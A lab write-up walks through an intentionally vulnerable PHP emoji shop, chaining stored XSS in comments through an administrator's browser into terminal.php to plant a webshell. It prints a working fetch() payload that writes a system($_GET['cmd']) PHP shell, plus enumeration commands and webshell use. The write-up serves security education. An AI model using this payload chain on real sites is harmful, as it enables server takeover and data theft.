Written By Aryan Giri

**Repository:** [Emoji_ShopXSS2SHELL](https://github.com/giriaryan694-a11y/Emoji_ShopXSS2SHELL/)

**Author:** Aryan Giri

## Lab Overview

**Emoji_ShopXSS2SHELL** is an intentionally vulnerable, lightweight web application designed for cybersecurity education, authorized security testing, CTF practice, and web application security research.

The lab demonstrates an attack chain involving:

* Stored Cross-Site Scripting (XSS)
* Privileged administrative functionality
* Unsafe command execution
* Browser-based administrative session abuse
* Webshell deployment
* Command execution through the resulting shell

The objective is to understand how a seemingly simple stored XSS vulnerability can become significantly more impactful when it executes inside a privileged administrator's browser session.

## Application Setup

After installing and starting the lab, the application is available at:

`http://10.19.115.73:8081/login.php`

<img width="1409" height="857" alt="Screenshot 2026-08-12 100207" src="https://github.com/user-attachments/assets/1a8155f5-3e2a-4cfd-b28f-defad9beaac1" />


The application initially presents a login page. Since this is a local intentionally vulnerable lab, a normal user account can be created for testing.

## Creating a Normal User

I registered a test account using:

```text
Username: tester1
Password: admin
```

<img width="1488" height="867" alt="Screenshot 2026-08-12 100240" src="https://github.com/user-attachments/assets/9f1b3aca-4828-42fd-a251-03d3b9b0e98c" />


After registration completes, the newly created account can be used to authenticate.

<img width="1444" height="852" alt="Screenshot 2026-08-12 100330" src="https://github.com/user-attachments/assets/4135ab0d-6725-48fe-8e3b-68591ebd8185" />


After logging in, the user is redirected to the main application interface.

## Exploring the Emoji Shop

The main page contains a list of emojis. Each entry provides access to additional information, including details and comments.

<img width="1586" height="876" alt="Screenshot 2026-08-12 100359" src="https://github.com/user-attachments/assets/eb43be6e-dc1f-4bb9-850c-6b51bdc677ff" />


The comments functionality is particularly interesting because user-controlled content is stored by the application and later rendered to other users.

For testing the administrative impact of the vulnerability, I used two separate Firefox profiles:

* A normal-user session
* A separate administrator session

Keeping the sessions isolated makes it easier to observe which browser context executes the stored JavaScript.

## Administrator Session

The administrator account used for the lab is:

```text
Username: admin
Password: admin123
```

After logging in as the administrator, the application exposes additional administrative functionality.

<img width="1605" height="834" alt="Screenshot 2026-08-12 100838" src="https://github.com/user-attachments/assets/9edf1cc5-1014-4266-b4cc-2d71a133434d" />


The administrator can access:

```text
admin.php
```
<img width="1577" height="860" alt="Screenshot 2026-08-12 100917" src="https://github.com/user-attachments/assets/0175a0b3-30ad-46da-9b88-de8b90f27487" />


The administrative interface provides functionality that is not available to a regular user.

## Administrative Command Execution

The lab also exposes a web terminal through:

```text
terminal.php
```

<img width="1583" height="807" alt="Screenshot 2026-08-12 101132" src="https://github.com/user-attachments/assets/0577b85d-be98-4a90-b937-24281f756494" />


The terminal allows commands to be executed through the web application.

There is also an `exec.php` endpoint capable of command execution, but it requires administrator privileges.

This difference is important to the attack chain: a normal user cannot directly access the privileged command-execution functionality, but stored JavaScript executed inside an administrator's browser can make requests using the administrator's existing privileges.

## Directory Enumeration

Although the application is open source and the relevant endpoints are already known, I also performed directory enumeration to demonstrate the reconnaissance phase.

I used Gobuster with the common directory wordlist and PHP extension discovery:

```bash
gobuster dir \
  -u http://10.19.115.73:8081 \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php \
  --exclude-length 3449
```

<img width="657" height="512" alt="Screenshot 2026-08-12 134534" src="https://github.com/user-attachments/assets/78859318-0550-4763-b185-1167b451f0ce" />


The enumeration identifies application endpoints including:

```text
login.php
admin.php
terminal.php
exec.php
```

The purpose here is not to discover a previously unknown application but to demonstrate how endpoint enumeration fits into a normal web application assessment.

## Identifying the Stored XSS

Returning to the normal-user session, I opened an emoji's details and comments interface.

<img width="1580" height="906" alt="Screenshot 2026-08-12 135725" src="https://github.com/user-attachments/assets/09581dba-dee0-4f3a-b509-057e59d2637d" />


The comment field accepts HTML/JavaScript content.

I started with a simple proof-of-concept payload:

```html
<script>alert(0)</script>
```

<img width="1054" height="634" alt="Screenshot 2026-08-12 135814" src="https://github.com/user-attachments/assets/410ac387-95c8-413b-b70f-ad7820296d9e" />


After submitting the comment, the JavaScript executes when the affected page is rendered.

<img width="843" height="443" alt="Screenshot 2026-08-12 135844" src="https://github.com/user-attachments/assets/b84c3f24-15b9-4577-9dd1-7eba80f3d3b9" />


This confirms that the comment is not being safely encoded before being inserted into the page.

The important distinction is that this is **stored XSS** rather than reflected XSS. The malicious content is persisted by the application and can subsequently execute when another user views the affected content.

## Executing the XSS in the Administrator Context

The next step is to observe what happens when the administrator views the stored comment.

I switched back to the administrator Firefox session and opened **Comments Overview**.

<img width="1618" height="877" alt="Screenshot 2026-08-12 135918" src="https://github.com/user-attachments/assets/c5ed98c8-035f-4a38-955d-dc2b04123ab2" />


The stored JavaScript executes in the administrator's browser context.

After dismissing the JavaScript alert, the interface displays the username associated with the comment, while the original comment content is not displayed normally.

<img width="1567" height="698" alt="Screenshot 2026-08-12 135953" src="https://github.com/user-attachments/assets/bbe9e3ed-70d3-4396-a93a-1f8980160f87" />


The reason is that the browser interprets the `<script>` element as executable HTML rather than treating it as ordinary text.

At this point, the vulnerability has crossed an important privilege boundary:

```text
Normal User
    |
    v
Stored Comment
    |
    v
JavaScript Execution
    |
    v
Administrator Browser
    |
    v
Privileged Application Request
```

## From Stored XSS to Command Execution

The administrator's browser can make authenticated requests to privileged endpoints.

The lab's `terminal.php` endpoint accepts POST requests containing a command. This allows the stored JavaScript to issue a request from the administrator's browser.

For the lab demonstration, I used the following payload to create a PHP command-execution shell:

```html
<script>
fetch('/terminal.php', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: new URLSearchParams({
        'cmd': `echo '<?php system($_GET["cmd"]); ?>' > /var/www/emoji_shop/shell.php`
    })
});
</script>
```

The important part of this payload is not the JavaScript itself but the request chain:

```text
Stored XSS
    |
    v
Administrator browser executes JavaScript
    |
    v
Authenticated POST request
    |
    v
terminal.php
    |
    v
Server-side command execution
    |
    v
shell.php created
```

<img width="1021" height="638" alt="Screenshot 2026-08-12 140214" src="https://github.com/user-attachments/assets/38a52c9f-8078-4bbf-852a-21456c132481" />


Once the malicious comment is stored, I return to the administrator session and open **Comments Overview** or refresh the page.

The JavaScript executes automatically while the administrator is viewing the stored comment.


https://github.com/user-attachments/assets/118dba0a-c616-4575-9b3d-9c552fbad1df


The result is that the server creates:

```text
/var/www/emoji_shop/shell.php
```

## Accessing the Webshell

After the payload executes, I return to the normal browser session.

The resulting endpoint can be accessed through:

```text
http://10.19.115.73:8081/shell.php?cmd=id
```

<img width="1522" height="314" alt="Screenshot 2026-08-12 140507" src="https://github.com/user-attachments/assets/211c10da-0170-4c68-8ddf-1e1bc9d9cc99" />


The `id` command confirms that the newly created endpoint is executing commands on the server.

Additional commands can then be supplied through the `cmd` parameter.



https://github.com/user-attachments/assets/b279b718-b644-4afb-a4de-7f715385d3b2



The resulting chain demonstrates how a stored XSS vulnerability can become a server-side command-execution primitive when combined with privileged functionality.

## Attack Chain

The complete lab flow can be summarized as:

```text
Normal User
    |
    | submits malicious comment
    v
Stored XSS
    |
    | administrator views comments
    v
Administrator Browser
    |
    | JavaScript executes with admin privileges
    v
terminal.php
    |
    | authenticated command execution
    v
shell.php
    |
    | cmd parameter
    v
Server Command Execution
```

The individual vulnerabilities become substantially more dangerous when chained together.

A simplified privilege flow looks like:

```text
Low Privilege
     |
     v
Stored XSS
     |
     v
Admin Browser Context
     |
     v
Admin-Only Endpoint
     |
     v
Server Command Execution
```

## Why the Chain Works

The core issue is the combination of multiple trust-boundary failures.

### 1. User input is stored without safe output encoding

The comment field accepts JavaScript and stores it in a form that is later rendered by another browser.

### 2. The stored content executes in a privileged context

The administrator visits the page containing the malicious comment, causing the browser to execute the stored JavaScript.

### 3. Privileged endpoints trust the authenticated browser session

The JavaScript executes from the administrator's browser and can therefore make requests to functionality available to that session.

### 4. The terminal provides server-side command execution

Once the privileged request reaches `terminal.php`, the supplied command is executed by the application.

The important lesson is that the XSS itself does not directly execute operating-system commands. Instead, it abuses the administrator's browser context to reach functionality that already has command-execution capability.

## Lab Takeaways

This home lab demonstrates an important web exploitation concept:

```text
XSS != automatically RCE
```

However:

```text
XSS
+
Privileged Session
+
Dangerous Administrative Functionality
=
Potential RCE Chain
```

A low-privileged stored XSS can therefore become a high-impact vulnerability when privileged application functionality is exposed through the same browser session.

The lab provides a practical environment for studying the relationship between client-side injection, authentication context, authorization boundaries, and server-side command execution.

## Repository

The complete intentionally vulnerable application and lab setup are available in the project repository:

[Emoji_ShopXSS2SHELL](https://github.com/giriaryan694-a11y/Emoji_ShopXSS2SHELL/)

This lab should only be deployed and tested in an environment where you have explicit authorization to perform security testing.
